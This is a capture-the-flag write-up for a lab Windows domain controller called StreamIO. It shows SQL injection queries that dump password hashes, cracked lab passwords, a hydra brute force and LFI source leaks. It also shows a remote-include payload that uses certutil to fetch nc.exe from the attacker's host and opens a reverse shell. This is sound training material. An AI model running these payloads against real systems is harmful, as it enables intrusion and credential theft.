
## CTF Writeup: StreamIO

---
## Reconnaissance

An initial scan revealed the following information about running services on the target server.

```
nmap -n -Pn -sSCV -p- -oN nmap.txt 10.129.58.13 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-17 12:19 -0500
Nmap scan report for 10.129.58.13
Host is up (0.021s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-08-18 00:22:17Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb, Site: Default-First-Site-Name)
443/tcp   open  ssl/https?
| ssl-cert: Subject: commonName=streamIO/countryName=EU
| Subject Alternative Name: DNS:streamIO.htb, DNS:watch.streamIO.htb
| Not valid before: 2022-02-22T07:03:28
|_Not valid after:  2022-03-24T07:03:28
|_ssl-date: 2026-08-18T00:24:13+00:00; +6h59m56s from scanner time.
| tls-alpn: 
|   h2
|_  http/1.1
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49678/tcp open  msrpc         Microsoft Windows RPC
49709/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 6h59m55s, deviation: 0s, median: 6h59m55s
| smb2-time: 
|   date: 2026-08-18T00:23:06
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 287.85 seconds
```

The target seems to be an DC. The TCP Scan provides us with information about the FQDN DC.streamio.htb, the hostname DC and multiple SAN's: streamio.htb & watch.streamIO.htb. Let's map them all to the target ip address in our local dns file.

```
echo "10.129.58.13 dc.streamio.htb streamio.htb watch.streamio.htb dc" | tee -a /etc/hosts
```

The target seems to be running an webserver on HTTP, but also encrypted with tls on port 443. Decided to start inspecting the normal domain on HTTP. It seems to be an default IIS Webpage.

Proceeded with enumerating endpoints on this target. Couldn't find any interesting endpoint.

```
feroxbuster --url http://streamio.htb
```

Tried enumerating subdomains using ffuf, but was also unsuccessful.

```
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://streamio.htb -H "Host: FUZZ.streamio.htb" -mc all -fs 703
```

Decided to move on to the HTTPS Website. This was more promising. Upon inspecting the https webpage, we actually get an Movie Stream Webpage called "StreamIO". The webpage itself almost seems to have not that much functionality. But I was able to retrieve potential usernameson an /about.php endpoint. I also found an login panel, which wasn't of any use yet.

```
oliver
barry
samantha
```

Tested if they are domain users, but doesn't seem so.

```
kerbrute userenum --dc 10.129.58.13 --domain streamio.htb users.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 08/17/26 - Ronnie Flathers @ropnop

2026/08/17 12:37:19 >  Using KDC(s):
2026/08/17 12:37:19 >   10.129.58.13:88

2026/08/17 12:37:19 >  Done! Tested 3 usernames (0 valid) in 0.020 seconds
```

Enumerated Endpoints & identified an /admin panel.

```
feroxbuster --url https://streamio.htb --insecure
```

But the /admin endpoint is forbidden / we aren't authorized to view it. Since we know from the TCP Scan that there is an subdomain mapped to the digital certificate. Let's try & check it out.

The webpage seems to be an FAQ page with an functionality to add your email to an subscription list.

Proceeded with enumerating endpoints.

```
feroxbuster --url https://watch.streamio.htb --insecure
```

Since I know that the backend language is php, I fuzzed for php files and found an interesting /search.php endpoint, which allowed us to search for movies.

```
feroxbuster --url https://watch.streamio.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html,zip,json,docx,aspx,asp,cgi,pdf --insecure
```

Inspecting that endpoint revealed an searchbar option, which when prompting inside an ' wasn't loading any movies anymore. Could it be vulnerable to SQLi?

Captured the network package using BurpSuite and saved it inside an sql.req file on my local machine.

Attempting to automize the sqli process using sqlmap failed.

```
sqlmap -r sql.req --batch --dbs
        ___
       __H__                                                                                                                 
 ___ ___[.]_____ ___ ___  {1.10.6#stable}                                                                                    
|_ -| . [)]     | .'| . |                                                                                                    
|___|_  [.]_|_|_|__,|  _|                                                                                                    
      |_|V...       |_|   https://sqlmap.org                                                                                 

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 13:14:49 /2026-08-17/

[13:14:49] [INFO] parsing HTTP request from 'sql.req'
[13:14:49] [CRITICAL] specified file 'sql.req' does not contain a usable HTTP request (with parameters)

[*] ending @ 13:14:49 /2026-08-17/
```

Also tried MSSQL Querys which are URL Encoded in BurpSuite, but wasn't possible.

```
q=21'SELECT+*+FROM+sysusers%3b
```

The following Union SQL Injection told us that the target is vulnerable to SQLi.

```
10' union select 1,2,3,4,5,6 -- -
```

The query returned 2, which means we can execute sql queries with the 2. number.

```
10' UNION SELECT 1, name, 3, 4, 5, 6 FROM sys.databases -- -
```

This displayed all databases, I'd like to enumerate the streamio database.

```
10' UNION SELECT 1, TABLE_NAME, 3, 4, 5, 6 FROM streamio.information_schema.tables -- -
```

This displayed two tables: movies & users. Let's dump the users table.

1. Identified columns in the table.

```
10' UNION SELECT 1, COLUMN_NAME, 3, 4, 5, 6 FROM streamio.INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'users' -- -
```

Utilized the following query to dump the username & password column. This displayed tons of credentials/ encrypted passwords.

```
10' UNION SELECT 1, username + ':' + password, 3, 4, 5, 6 FROM streamio.dbo.users -- -
```

Let's list all and paste them inside crackstation.net.

```
665a50ac9eaa781e4f7f04199db97a11
1c2b3d8270321140e5153f6637d3ee53
0049ac57646627b8d7aeaccf8b6a936f
3961548825e3e21df5646cafe11c6c76
54c88b2dbd7b1a84012fabc1a4c73415
22ee218331afd081b0dcd8115284bae3
2a4e2cf22dd8fcb45adcb91be1e22ae8
35394484d89fcfdb3c5e447fe749d213
ef8f3d30a856cf166fb8215aca93e9ff
ec33265e5fc8c2f1b0c137bb7b3632b5
8097cedd612cc37c29db152b6e9edbd3
0cfaaaafb559f081df2befbe66686de0
c660060492d9edcaa8332d89c99c9239
6dcd87740abb64edfa36d170f0d5450d
08344b85b329d7efd611b7a7743e8a09
ee0b8a0937abd60c2882eacb2f8dc49f
7df45a9e3de3863807c026ba48e55fb3
b83439b16f844bd6ffe35c02fe21b3c0
fd78db29173a5cf701bd69027cb9bf6b
f03b910e2bd0313a23fdd7575f34a694

dc332fb5576e9631c9dae83f194f8e70
f87d3c0d6c8fd686aacc6627f1f493a5
083ffae904143c4796e464dac33c1f7d
384463526d288edcc95fc3701e523bc7
3577c47eb1e12c8ba021611e1280753c
925e5408ecb67aea449373d668b7359e
bf55e15b119860a6e6b5a164377da719
b22abb47a02b52d5dfa27fb0b534f693
d62be0dc82071bccc1322d64ec5b6c51
b779ba15cedfd22a023c4d8bcf5f2332
```

Also created an userlist:

```
yoshihide
William
Victoria
Victor
Theodore
Thane
Stan
Samantha
Sabrina
Robin
Robert
Oliver
Michelle
Lucifer
Lenord
Lauren
Juliette
James
Gloria
Garfield
Diablo
Clara
Carmon
Bruno
Baxter
Barry
Barbra
Austin
Alexandra
admin
```

Cracked all the MD5 Hashes:

```
paddpadd
$hadoW
$monique$1991$
%$clara
$3xybitch
##123a8j8w5123##
physics69i
!?Love?!123
!!sabrina$
highschoolmusical
!5psycho8!
66boysandgirls..
```

Bruteforced the login panel on the main webpage and gained access.

```
hydra -L users.txt -P passwords.txt streamio.htb https-post-form  "/login.php:username=^USER^&password=^PASS^:F=Login Failed"
Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-08-17 13:40:11
[DATA] max 16 tasks per 1 server, overall 16 tasks, 360 login tries (l:30/p:12), ~23 tries per task
[DATA] attacking http-post-forms://streamio.htb:443/login.php:username=^USER^&password=^PASS^:F=Login Failed
[443][http-post-form] host: streamio.htb   login: yoshihide   password: 66boysandgirls..
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-08-17 13:40:21
```

```
yoshihide:66boysandgirls..
```

After logging in we can now view the /admin endpoint.

There is multiple Tabs:

```
User management
Staff management
Movie management
Leave a message for admin
```

All of those Tabs do not reveal information we don't know yet, but they are displaying items & the browser parameter are quite interesting, because they expect input ?user=, ?staff=, ?movie= etc. There may be additional parameters and we can try bruteforcing them using ffuf!

```
ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt -u 'https://streamio.htb/admin/?FUZZ=' -b PHPSESSID=h0pkknlltm6lcg94gu8uas8muh -fs 1678

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://streamio.htb/admin/?FUZZ=
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt
 :: Header           : Cookie: PHPSESSID=h0pkknlltm6lcg94gu8uas8muh
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 1678
________________________________________________

debug                   [Status: 200, Size: 1712, Words: 90, Lines: 50, Duration: 21ms]
movie                   [Status: 200, Size: 320235, Words: 15986, Lines: 10791, Duration: 36ms]
staff                   [Status: 200, Size: 12484, Words: 1784, Lines: 399, Duration: 34ms]
user                    [Status: 200, Size: 2073, Words: 146, Lines: 63, Duration: 24ms]
:: Progress: [6453/6453] :: Job [1/1] :: 1851 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
```

This enumerated one new parameter, which is quite interesting! It's called debug. Let's use it.

After prompting the parameter into the browser, the browser displays an string:

```
 this option is for developers only 
```

After putting an index.php inside the parameter it displayed an error.

```
 this option is for developers only ---- ERROR ----
```

Could we bypass this by utilizing php wrappers?

The standard php wrapper caused a lot of issue with the website.

```
?debug=php://filter/resource=index.php
```

So I moved onto to an base64 encoded one:

```
?debug=php://filter/convert.base64-encode/resource=index.php
```

Decoding the base64 encoded string actually provided us with the index.php in which hardcoded database credentials were discovered!

```
echo "onlyPD9waHAKZGVmaW5lKCdpbmNsdWRlZCcsdHJ1ZSk7CnNlc3Npb25fc3RhcnQoKTsKaWYoIWlzc2V0KCRfU0VTU0lPTlsnYWRtaW4nXSkpCnsKCWhlYWRlcignSFRUUC8xLjEgNDAzIEZvcmJpZGRlbicpOwoJZGllKCI8aDE+Rk9SQklEREVOPC9oMT4iKTsKfQokY29ubmVjdGlvbiA9IGFycmF5KCJEYXRhYmFzZSI9PiJTVFJFQU1JTyIsICJVSUQiID0+ICJkYl9hZG1pbiIsICJQV0QiID0+ICdCMUBoeDMxMjM0NTY3ODkwJyk7CiRoYW5kbGUgPSBzcWxzcnZfY29ubmVjdCgnKGxvY2FsKScsJGNvbm5lY3Rpb24pOwoKPz4KPCFET0NUWVBFIGh0bWw+CjxodG1sPgo8aGVhZD4KCTxtZXRhIGNoYXJzZXQ9InV0Zi04Ij4KCTx0aXRsZT5BZG1pbiBwYW5lbDwvdGl0bGU+Cgk8bGluayByZWwgPSAiaWNvbiIgaHJlZj0iL2ltYWdlcy9pY29uLnBuZyIgdHlwZSA9ICJpbWFnZS94LWljb24iPgoJPCEtLSBCYXNpYyAtLT4KCTxtZXRhIGNoYXJzZXQ9InV0Zi04IiAvPgoJPG1ldGEgaHR0cC1lcXVpdj0iWC1VQS1Db21wYXRpYmxlIiBjb250ZW50PSJJRT1lZGdlIiAvPgoJPCEtLSBNb2JpbGUgTWV0YXMgLS0+Cgk8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEsIHNocmluay10by1maXQ9bm8iIC8+Cgk8IS0tIFNpdGUgTWV0YXMgLS0+Cgk8bWV0YSBuYW1lPSJrZXl3b3JkcyIgY29udGVudD0iIiAvPgoJPG1ldGEgbmFtZT0iZGVzY3JpcHRpb24iIGNvbnRlbnQ9IiIgLz4KCTxtZXRhIG5hbWU9ImF1dGhvciIgY29udGVudD0iIiAvPgoKPGxpbmsgaHJlZj0iaHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L25wbS9ib290c3RyYXBANS4xLjMvZGlzdC9jc3MvYm9vdHN0cmFwLm1pbi5jc3MiIHJlbD0ic3R5bGVzaGVldCIgaW50ZWdyaXR5PSJzaGEzODQtMUJtRTRrV0JxNzhpWWhGbGR2S3VoZlRBVTZhdVU4dFQ5NFdySGZ0akRickNFWFNVMW9Cb3F5bDJRdlo2aklXMyIgY3Jvc3NvcmlnaW49ImFub255bW91cyI+CjxzY3JpcHQgc3JjPSJodHRwczovL2Nkbi5qc2RlbGl2ci5uZXQvbnBtL2Jvb3RzdHJhcEA1LjEuMy9kaXN0L2pzL2Jvb3RzdHJhcC5idW5kbGUubWluLmpzIiBpbnRlZ3JpdHk9InNoYTM4NC1rYTdTazBHbG40Z210ejJNbFFuaWtUMXdYZ1lzT2crT01odVArSWxSSDlzRU5CTzBMUm41cSs4bmJUb3Y0KzFwIiBjcm9zc29yaWdpbj0iYW5vbnltb3VzIj48L3NjcmlwdD4KCgk8IS0tIEN1c3RvbSBzdHlsZXMgZm9yIHRoaXMgdGVtcGxhdGUgLS0+Cgk8bGluayBocmVmPSIvY3NzL3N0eWxlLmNzcyIgcmVsPSJzdHlsZXNoZWV0IiAvPgoJPCEtLSByZXNwb25zaXZlIHN0eWxlIC0tPgoJPGxpbmsgaHJlZj0iL2Nzcy9yZXNwb25zaXZlLmNzcyIgcmVsPSJzdHlsZXNoZWV0IiAvPgoKPC9oZWFkPgo8Ym9keT4KCTxjZW50ZXIgY2xhc3M9ImNvbnRhaW5lciI+CgkJPGJyPgoJCTxoMT5BZG1pbiBwYW5lbDwvaDE+CgkJPGJyPjxocj48YnI+CgkJPHVsIGNsYXNzPSJuYXYgbmF2LXBpbGxzIG5hdi1maWxsIj4KCQkJPGxpIGNsYXNzPSJuYXYtaXRlbSI+CgkJCQk8YSBjbGFzcz0ibmF2LWxpbmsiIGhyZWY9Ij91c2VyPSI+VXNlciBtYW5hZ2VtZW50PC9hPgoJCQk8L2xpPgoJCQk8bGkgY2xhc3M9Im5hdi1pdGVtIj4KCQkJCTxhIGNsYXNzPSJuYXYtbGluayIgaHJlZj0iP3N0YWZmPSI+U3RhZmYgbWFuYWdlbWVudDwvYT4KCQkJPC9saT4KCQkJPGxpIGNsYXNzPSJuYXYtaXRlbSI+CgkJCQk8YSBjbGFzcz0ibmF2LWxpbmsiIGhyZWY9Ij9tb3ZpZT0iPk1vdmllIG1hbmFnZW1lbnQ8L2E+CgkJCTwvbGk+CgkJCTxsaSBjbGFzcz0ibmF2LWl0ZW0iPgoJCQkJPGEgY2xhc3M9Im5hdi1saW5rIiBocmVmPSI/bWVzc2FnZT0iPkxlYXZlIGEgbWVzc2FnZSBmb3IgYWRtaW48L2E+CgkJCTwvbGk+CgkJPC91bD4KCQk8YnI+PGhyPjxicj4KCQk8ZGl2IGlkPSJpbmMiPgoJCQk8P3BocAoJCQkJaWYoaXNzZXQoJF9HRVRbJ2RlYnVnJ10pKQoJCQkJewoJCQkJCWVjaG8gJ3RoaXMgb3B0aW9uIGlzIGZvciBkZXZlbG9wZXJzIG9ubHknOwoJCQkJCWlmKCRfR0VUWydkZWJ1ZyddID09PSAiaW5kZXgucGhwIikgewoJCQkJCQlkaWUoJyAtLS0tIEVSUk9SIC0tLS0nKTsKCQkJCQl9IGVsc2UgewoJCQkJCQlpbmNsdWRlICRfR0VUWydkZWJ1ZyddOwoJCQkJCX0KCQkJCX0KCQkJCWVsc2UgaWYoaXNzZXQoJF9HRVRbJ3VzZXInXSkpCgkJCQkJcmVxdWlyZSAndXNlcl9pbmMucGhwJzsKCQkJCWVsc2UgaWYoaXNzZXQoJF9HRVRbJ3N0YWZmJ10pKQoJCQkJCXJlcXVpcmUgJ3N0YWZmX2luYy5waHAnOwoJCQkJZWxzZSBpZihpc3NldCgkX0dFVFsnbW92aWUnXSkpCgkJCQkJcmVxdWlyZSAnbW92aWVfaW5jLnBocCc7CgkJCQllbHNlIAoJCQk/PgoJCTwvZGl2PgoJPC9jZW50ZXI+CjwvYm9keT4KPC9odG1sPg==" | base64 -d
```

```
db_admin:B1@hx31234567890
```

Unfortunately I couldn't do anything useful with those credentials for now. So I presumed with enumerating php endpoints on the /admin endpoint.

```
feroxbuster --url https://streamio.htb/admin -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -x php -b "PHPSESSID=h0pkknlltm6lcg94gu8uas8muh"
```

Found an interesting /master.php endpoint, upon viewing it we get the information that it's only available through "includes". This hints that this php wrapper parameter semantic could aswell be an LFI. Let's check it out!

Utilized the php wrapper lfi in order get an base64 encoded string of the master.php file. Let's decode it on my local machine in order to view it's contents.

```
https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=master.php
```

Analyzing the source code of /master.php revealed an critical vulnerability. It evaluates all .php scripts which aren't "index.php". This could potentially lead to RFI. If we call the ?debug=master.php in an network package and add the "include" parameter to it which points at an malicious webserver of ours, we could make the server execute an webshell or even worst an reverse shell!

```
echo "onlyPGgxPk1vdmllIG1hbmFnbWVudDwvaDE+DQo8P3BocA0KaWYoIWRlZmluZWQoJ2luY2x1ZGVkJykpDQoJZGllKCJPbmx5IGFjY2Vzc2FibGUgdGhyb3VnaCBpbmNsdWRlcyIpOw0KaWYoaXNzZXQoJF9QT1NUWydtb3ZpZV9pZCddKSkNCnsNCiRxdWVyeSA9ICJkZWxldGUgZnJvbSBtb3ZpZXMgd2hlcmUgaWQgPSAiLiRfUE9TVFsnbW92aWVfaWQnXTsNCiRyZXMgPSBzcWxzcnZfcXVlcnkoJGhhbmRsZSwgJHF1ZXJ5LCBhcnJheSgpLCBhcnJheSgiU2Nyb2xsYWJsZSI9PiJidWZmZXJlZCIpKTsNCn0NCiRxdWVyeSA9ICJzZWxlY3QgKiBmcm9tIG1vdmllcyBvcmRlciBieSBtb3ZpZSI7DQokcmVzID0gc3Fsc3J2X3F1ZXJ5KCRoYW5kbGUsICRxdWVyeSwgYXJyYXkoKSwgYXJyYXkoIlNjcm9sbGFibGUiPT4iYnVmZmVyZWQiKSk7DQp3aGlsZSgkcm93ID0gc3Fsc3J2X2ZldGNoX2FycmF5KCRyZXMsIFNRTFNSVl9GRVRDSF9BU1NPQykpDQp7DQo/Pg0KDQo8ZGl2Pg0KCTxkaXYgY2xhc3M9ImZvcm0tY29udHJvbCIgc3R5bGU9ImhlaWdodDogM3JlbTsiPg0KCQk8aDQgc3R5bGU9ImZsb2F0OmxlZnQ7Ij48P3BocCBlY2hvICRyb3dbJ21vdmllJ107ID8+PC9oND4NCgkJPGRpdiBzdHlsZT0iZmxvYXQ6cmlnaHQ7cGFkZGluZy1yaWdodDogMjVweDsiPg0KCQkJPGZvcm0gbWV0aG9kPSJQT1NUIiBhY3Rpb249Ij9tb3ZpZT0iPg0KCQkJCTxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9Im1vdmllX2lkIiB2YWx1ZT0iPD9waHAgZWNobyAkcm93WydpZCddOyA/PiI+DQoJCQkJPGlucHV0IHR5cGU9InN1Ym1pdCIgY2xhc3M9ImJ0biBidG4tc20gYnRuLXByaW1hcnkiIHZhbHVlPSJEZWxldGUiPg0KCQkJPC9mb3JtPg0KCQk8L2Rpdj4NCgk8L2Rpdj4NCjwvZGl2Pg0KPD9waHANCn0gIyB3aGlsZSBlbmQNCj8+DQo8YnI+PGhyPjxicj4NCjxoMT5TdGFmZiBtYW5hZ21lbnQ8L2gxPg0KPD9waHANCmlmKCFkZWZpbmVkKCdpbmNsdWRlZCcpKQ0KCWRpZSgiT25seSBhY2Nlc3NhYmxlIHRocm91Z2ggaW5jbHVkZXMiKTsNCiRxdWVyeSA9ICJzZWxlY3QgKiBmcm9tIHVzZXJzIHdoZXJlIGlzX3N0YWZmID0gMSAiOw0KJHJlcyA9IHNxbHNydl9xdWVyeSgkaGFuZGxlLCAkcXVlcnksIGFycmF5KCksIGFycmF5KCJTY3JvbGxhYmxlIj0+ImJ1ZmZlcmVkIikpOw0KaWYoaXNzZXQoJF9QT1NUWydzdGFmZl9pZCddKSkNCnsNCj8+DQo8ZGl2IGNsYXNzPSJhbGVydCBhbGVydC1zdWNjZXNzIj4gTWVzc2FnZSBzZW50IHRvIGFkbWluaXN0cmF0b3I8L2Rpdj4NCjw/cGhwDQp9DQokcXVlcnkgPSAic2VsZWN0ICogZnJvbSB1c2VycyB3aGVyZSBpc19zdGFmZiA9IDEiOw0KJHJlcyA9IHNxbHNydl9xdWVyeSgkaGFuZGxlLCAkcXVlcnksIGFycmF5KCksIGFycmF5KCJTY3JvbGxhYmxlIj0+ImJ1ZmZlcmVkIikpOw0Kd2hpbGUoJHJvdyA9IHNxbHNydl9mZXRjaF9hcnJheSgkcmVzLCBTUUxTUlZfRkVUQ0hfQVNTT0MpKQ0Kew0KPz4NCg0KPGRpdj4NCgk8ZGl2IGNsYXNzPSJmb3JtLWNvbnRyb2wiIHN0eWxlPSJoZWlnaHQ6IDNyZW07Ij4NCgkJPGg0IHN0eWxlPSJmbG9hdDpsZWZ0OyI+PD9waHAgZWNobyAkcm93Wyd1c2VybmFtZSddOyA/PjwvaDQ+DQoJCTxkaXYgc3R5bGU9ImZsb2F0OnJpZ2h0O3BhZGRpbmctcmlnaHQ6IDI1cHg7Ij4NCgkJCTxmb3JtIG1ldGhvZD0iUE9TVCI+DQoJCQkJPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0ic3RhZmZfaWQiIHZhbHVlPSI8P3BocCBlY2hvICRyb3dbJ2lkJ107ID8+Ij4NCgkJCQk8aW5wdXQgdHlwZT0ic3VibWl0IiBjbGFzcz0iYnRuIGJ0bi1zbSBidG4tcHJpbWFyeSIgdmFsdWU9IkRlbGV0ZSI+DQoJCQk8L2Zvcm0+DQoJCTwvZGl2Pg0KCTwvZGl2Pg0KPC9kaXY+DQo8P3BocA0KfSAjIHdoaWxlIGVuZA0KPz4NCjxicj48aHI+PGJyPg0KPGgxPlVzZXIgbWFuYWdtZW50PC9oMT4NCjw/cGhwDQppZighZGVmaW5lZCgnaW5jbHVkZWQnKSkNCglkaWUoIk9ubHkgYWNjZXNzYWJsZSB0aHJvdWdoIGluY2x1ZGVzIik7DQppZihpc3NldCgkX1BPU1RbJ3VzZXJfaWQnXSkpDQp7DQokcXVlcnkgPSAiZGVsZXRlIGZyb20gdXNlcnMgd2hlcmUgaXNfc3RhZmYgPSAwIGFuZCBpZCA9ICIuJF9QT1NUWyd1c2VyX2lkJ107DQokcmVzID0gc3Fsc3J2X3F1ZXJ5KCRoYW5kbGUsICRxdWVyeSwgYXJyYXkoKSwgYXJyYXkoIlNjcm9sbGFibGUiPT4iYnVmZmVyZWQiKSk7DQp9DQokcXVlcnkgPSAic2VsZWN0ICogZnJvbSB1c2VycyB3aGVyZSBpc19zdGFmZiA9IDAiOw0KJHJlcyA9IHNxbHNydl9xdWVyeSgkaGFuZGxlLCAkcXVlcnksIGFycmF5KCksIGFycmF5KCJTY3JvbGxhYmxlIj0+ImJ1ZmZlcmVkIikpOw0Kd2hpbGUoJHJvdyA9IHNxbHNydl9mZXRjaF9hcnJheSgkcmVzLCBTUUxTUlZfRkVUQ0hfQVNTT0MpKQ0Kew0KPz4NCg0KPGRpdj4NCgk8ZGl2IGNsYXNzPSJmb3JtLWNvbnRyb2wiIHN0eWxlPSJoZWlnaHQ6IDNyZW07Ij4NCgkJPGg0IHN0eWxlPSJmbG9hdDpsZWZ0OyI+PD9waHAgZWNobyAkcm93Wyd1c2VybmFtZSddOyA/PjwvaDQ+DQoJCTxkaXYgc3R5bGU9ImZsb2F0OnJpZ2h0O3BhZGRpbmctcmlnaHQ6IDI1cHg7Ij4NCgkJCTxmb3JtIG1ldGhvZD0iUE9TVCI+DQoJCQkJPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0idXNlcl9pZCIgdmFsdWU9Ijw/cGhwIGVjaG8gJHJvd1snaWQnXTsgPz4iPg0KCQkJCTxpbnB1dCB0eXBlPSJzdWJtaXQiIGNsYXNzPSJidG4gYnRuLXNtIGJ0bi1wcmltYXJ5IiB2YWx1ZT0iRGVsZXRlIj4NCgkJCTwvZm9ybT4NCgkJPC9kaXY+DQoJPC9kaXY+DQo8L2Rpdj4NCjw/cGhwDQp9ICMgd2hpbGUgZW5kDQo/Pg0KPGJyPjxocj48YnI+DQo8Zm9ybSBtZXRob2Q9IlBPU1QiPg0KPGlucHV0IG5hbWU9ImluY2x1ZGUiIGhpZGRlbj4NCjwvZm9ybT4NCjw/cGhwDQppZihpc3NldCgkX1BPU1RbJ2luY2x1ZGUnXSkpDQp7DQppZigkX1BPU1RbJ2luY2x1ZGUnXSAhPT0gImluZGV4LnBocCIgKSANCmV2YWwoZmlsZV9nZXRfY29udGVudHMoJF9QT1NUWydpbmNsdWRlJ10pKTsNCmVsc2UNCmVjaG8oIiAtLS0tIEVSUk9SIC0tLS0gIik7DQp9DQo/Pg==" | base64 -d
```

Started up python3 webserver in which my webshell is stored.

```
python3 -m http.server 80
```

This actually downloaded & executed the test.php which executes the "whoami" command on the target server!

```
POST /admin/?debug=master.php HTTP/2
Host: streamio.htb
Cookie: PHPSESSID=u8so05373lq1p85t8au7sihnjo
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Content-Length: 35
Content-Type: application/x-www-form-urlencoded

include=http://10.10.14.57/test.php
```

As we can see the whoami command successfully executed. Let's now try & get RCE!

```
<form method="POST">
<input name="include" hidden>
</form>
streamio\yoshihide
		</div>
	</center>
</body>
</html>
```

Started up my listener on port 53.

```
rlwrap nc -lvnp 53
```

We'll download nc.exe onto the target server.

```
mousepad test.php
system("certutil -urlcache -split -f http://10.10.14.57/nc.exe nc.exe");
system("nc.exe 10.10.14.57 53 -e cmd.exe");
```

Re-sent the network package, it downloaded the test.php file again, which should have also downloaded nc.exe from our python3 webserver.

Gained RCE as user "streamio\yoshihide".

```
rlwrap nc -lvnp 53
listening on [any] 53 ...
connect to [10.10.14.57] from (UNKNOWN) [10.129.58.127] 53492
Microsoft Windows [Version 10.0.17763.2928]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\inetpub\streamio.htb\admin>
```

Identified an potential database password in C:\inetpub\watch.streamio.htb\search.php

```
db_user:B1@hB1@hB1@h
```

Enumerated running services of the target server, and we see that there is an MSSQL Database, which wasn't previously discovered in the TCP Scan. Most likely network segmentation hardened the database.

```
netstat -an
```

We can enumerate the database using an in-built windows tool called "sqlcmd".

```
sqlcmd -q "SELECT name FROM sys.databases;"
```

Tried querying the database, but this didn't seem to work.

```
C:\>sqlcmd -q "SELECT * FROM streamio_backup.information_schema.tables;"
Msg 916, Level 14, State 2, Server DC, Line 1
The server principal "streamIO\yoshihide" is not able to access the database "streamio_backup" under the current security context.
```

As we can see from the server response our current user doesn't have the necessary authentication in order to connect to the "backup" database. Since we previously retrieved two potential database credentials, let's try & use them!

This worked!

```
sqlcmd -S localhost -U db_admin -P B1@hx31234567890 -d streamio_backup -Q "SELECT * FROM streamio_backup.information_schema.tables;"
```

Dumped the users table & retrieved the encoded password of user "nikk37". Which we previously identified being an actual user on the domain controller.

```
sqlcmd -S localhost -U db_admin -P B1@hx31234567890 -d streamio_backup -Q "SELECT * FROM streamio_backup.dbo.users;"
```

```
nikk37:389d14cb8e4e9b94b137deb1caf0612a
```

Since from intuition I know that this seems to be MD5 encrypted, let's utilize crackstation.net again in order to crack the password.

```
nikk37:get_dem_girls2@yahoo.com
```

Added those credentials to our users.txt and passwords.txt wordlists and started spraying SMB.

